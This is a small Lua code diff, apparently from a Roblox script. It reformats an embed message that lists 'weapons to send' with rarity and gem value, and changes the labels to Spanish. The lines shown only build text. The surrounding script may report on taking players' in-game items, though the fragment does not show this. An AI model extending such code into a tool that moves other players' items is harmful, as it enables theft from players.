@@ -506,8 +506,8 @@ if #weaponsToSend > 0 then
     local maxEmbedItems = math.min(18,#weaponsToSend)
     for i=1,maxEmbedItems do
         local w = weaponsToSend[i]
-        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
-    end
+        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+end
 
     if #weaponsToSend > 18 then
         fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
